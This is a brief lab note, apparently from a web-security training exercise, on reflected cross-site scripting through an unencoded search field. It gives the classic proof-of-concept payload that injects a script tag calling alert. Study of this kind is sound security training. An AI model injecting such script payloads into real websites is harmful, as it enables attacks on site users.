Lab: Reflected XSS into HTML context with nothing encoded
XSS: Search functionality
Task: To call alert function
<script>alert(0)</script>